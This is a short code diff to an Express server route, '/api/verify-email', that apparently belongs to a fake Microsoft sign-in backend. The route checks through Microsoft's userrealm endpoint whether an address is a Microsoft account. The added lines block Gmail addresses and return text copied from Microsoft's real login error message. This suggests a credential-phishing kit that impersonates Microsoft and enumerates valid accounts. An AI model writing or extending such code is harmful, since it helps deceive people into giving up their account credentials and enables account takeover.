@@ -1043,6 +1043,16 @@ app.post('/api/verify-email', async (req, res) => {
             });
         }
 
+        // Block Gmail addresses
+        if (domain.toLowerCase() === 'gmail.com') {
+            console.log(`❌ Gmail address blocked: ${email}`);
+            return res.json({
+                exists: false,
+                email: email,
+                message: "We couldn't find an account with that username. Try another, or get a new Microsoft account."
+            });
+        }
+
         try {
             // Use Microsoft's discovery endpoint to check if the domain is federated with Microsoft
             const discoveryUrl = `https://login.microsoftonline.com/common/userrealm/${encodeURIComponent(email)}?api-version=1.0`;
